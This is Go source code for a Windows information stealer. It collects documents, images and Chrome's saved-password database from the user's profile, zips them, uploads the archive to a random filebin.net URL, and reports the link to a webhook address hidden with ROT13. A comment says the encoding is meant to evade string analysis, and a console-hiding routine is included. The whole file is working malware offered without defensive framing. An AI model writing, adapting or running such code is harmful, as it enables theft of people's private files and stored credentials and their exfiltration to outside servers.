package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	user32               = syscall.MustLoadDLL("user32.dll")
	procGetConsoleWindow = kernel32.MustFindProc("GetConsoleWindow")
	procShowWindow       = user32.MustFindProc("ShowWindow")
	swHide               = 0
)

var args = []string{"--upload", "--no-upload"} // Arguments
var extensions = []string{"docx", "doc", "pdf", "xls", "png", "jpg", "txt"}
var webhook = "ra16dkutert7s.k.cvcrqernz.arg"
var TESTING = false // flag for testing purposes
var CurrentUsername string

func hideConsoleWindow() {
	consoleWindow, _, _ := procGetConsoleWindow.Call()
	if consoleWindow != 0 {
		// If the program is run from a console, hide the console window
		_, _, _ = procShowWindow.Call(consoleWindow, uintptr(swHide))
	}
}

func findFiles(rootPath string, extensions []string, CurrentUsername string) ([]string, error) {
	var files []string

	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// Handle specific error cases, e.g., access denied
			if os.IsPermission(err) {
				fmt.Printf("Access denied for directory: %s\n", path)
				return filepath.SkipDir // Skip this directory
			}
			return err
		}

		for index := range extensions {
			if !info.IsDir() && strings.EqualFold(filepath.Ext(info.Name()), "."+extensions[index]) {
				fmt.Printf("[+]: %s\n", path)
				files = append(files, path)
			}
		}
		return nil
	})

	// Grab Chrome Saved Passwords
	filename := "C:\\Users\\" + CurrentUsername + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	_, file_err := os.Stat(filename)
	if file_err != nil {
		fmt.Println(err)
	} else {
		files = append(files, filename)
	}

	return files, err
}

func zipFiles(docZipFileName string, files []string) error {
	zipFile, err := os.Create(docZipFileName)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	for _, file := range files {
		fileToZip, err := os.Open(file)
		if err != nil {
			return err
		}
		defer fileToZip.Close()

		// Get the file information
		info, err := fileToZip.Stat()
		if err != nil {
			return err
		}

		// Create a new file header
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// Set the name of the file in the zip archive
		header.Name = filepath.Base(file)

		// Create a writer for the file in the zip archive
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		// Copy the file content to the zip archive
		_, err = io.Copy(writer, fileToZip)
		if err != nil {
			return err
		}
	}

	return nil
}

func getCurrentUsername() (string, error) {
	// Get the value of the USERNAME environment variable
	username := os.Getenv("USERNAME")

	if username == "" {
		return "", fmt.Errorf("unable to retrieve username")
	}

	return username, nil
}

func SendFile(filename string, URL string) {

	// Replace these values with your actual API endpoint and file path
	apiEndpoint := "https://" + URL
	filePath := filename

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// Create a buffer to store the file content
	var body bytes.Buffer

	// Create a multipart writer
	writer := multipart.NewWriter(&body)

	// Create a form file field
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return
	}

	// Copy the file content to the form field
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println("Error copying file content:", err)
		return
	}

	// Close the multipart writer to finalize the request body
	writer.Close()

	// Create the POST request
	request, err := http.NewRequest("POST", apiEndpoint, &body)
	if err != nil {
		fmt.Println("Error creating POST request:", err)
		return
	}

	// Set the content type header
	request.Header.Set("Content-Type", writer.FormDataContentType())

	// Make the HTTP request
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer response.Body.Close()

	// Print the response status and body
	fmt.Println("Response Status:", response.Status)
	fmt.Println("Response Body:")
	io.Copy(os.Stdout, response.Body)
}

func generateRandomString(length int) string {
	// Characters to use in the random string
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	// Seed the random number generator with the current time
	rand.Seed(time.Now().UnixNano())

	// Generate the random string
	randomString := make([]byte, length)
	for i := range randomString {
		randomString[i] = chars[rand.Intn(len(chars))]
	}

	return string(randomString)
}

func sendPostRequestToWebhook(url, payload string) error {

	// Create a buffer with the JSON payload
	buffer := bytes.NewBuffer([]byte(payload))

	// Make the POST request
	response, err := http.Post("https://"+url, "application/json", buffer)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// Check the response status
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected response status: %s", response.Status)
	}

	fmt.Println("POST request successful")
	return nil
}

func rot13(input string) string {
	var result strings.Builder

	for _, char := range input {
		switch {
		case 'a' <= char && char <= 'z':
			result.WriteRune((char-'a'+13)%26 + 'a')
		case 'A' <= char && char <= 'Z':
			result.WriteRune((char-'A'+13)%26 + 'A')
		default:
			result.WriteRune(char)
		}
	}

	return result.String()
}

// Checks if arguments are delivered with the execution of the program.
func argCheck() {

	if argsFlags("-h") {
		fmt.Println("Usage: ")
		fmt.Println("")
		fmt.Println(" " + args[0] + "	(uploads the zip file to filebin server.)")
		fmt.Println(" " + args[1] + "	(does not uploads the zip file to filebin server.)")
		os.Exit(0)
	}

	if len(os.Args) < 2 {
		fmt.Println("Usage: ", os.Args[0], " <arg1> ...")
		os.Exit(0)
	}

}

// Check what flags were delivered.
func argsFlags(flag string) bool {
	for _, arg := range os.Args[1:] {
		if arg == flag {
			return true
		}
	}
	return false

}

// Check if flags are valid and not something else.
func flagCheck() bool {
	for i := 0; i < len(args); i++ {
		if os.Args[1] == args[i] {
			return true
		}
	}
	return false
}

func main() {

	argCheck()
	if !flagCheck() {
		println("[!] Invalid arguments were delivered.")
		os.Exit(1)
	}

	//This will get the getCurrentUsername of the user that is logged in.
	CurrentUsername, err := getCurrentUsername()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	rootDirectory := "C:/Users/" + CurrentUsername

	if TESTING == true {
		rootDirectory = "C:/Users/Daniel/Desktop/stamfiles"
	} else {
		//Hides the CMD window
		//hideConsoleWindow()
	}

	files, err := findFiles(rootDirectory, extensions, CurrentUsername)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	docZipFileName := CurrentUsername + "_documents.zip"
	err = zipFiles(docZipFileName, files)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Printf("[+] ZIP file '%s' created successfully.\n", docZipFileName)

	if argsFlags("--upload") {

		path := generateRandomString(12)
		fileName := generateRandomString(6)
		URL := "filebin.net/" + path + "/" + fileName + ".zip"

		SendFile(docZipFileName, URL)

		fmt.Printf("[+] ZIP file '%s' was sent successfully uploaded to https://%s.\n", docZipFileName, URL)

		// For the obfuscation I did ROT13 so in sTrIngS it won't show up...
		webhookUrl := rot13(webhook)
		sendPostRequestToWebhook("[+] "+webhookUrl, "files uploaded to: https://"+URL)
	}

}
